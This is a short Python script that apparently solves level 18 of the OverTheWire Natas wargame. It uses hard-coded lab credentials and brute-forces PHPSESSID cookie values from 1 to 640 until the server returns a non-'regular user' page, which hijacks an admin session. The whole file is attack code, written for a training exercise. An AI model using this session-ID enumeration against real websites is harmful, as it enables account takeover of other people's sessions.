#!/usr/bin/env python3
import requests

auth=("natas18", "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP")
for i in range(1, 641):
    print(i)
    headers={'Cookie': 'PHPSESSID=%d' % i}
    r = requests.get('http://natas18.natas.labs.overthewire.org/index.php?debug', auth=auth, headers=headers)
    if not 'regular user' in r.text:
        print(r.text)
        break
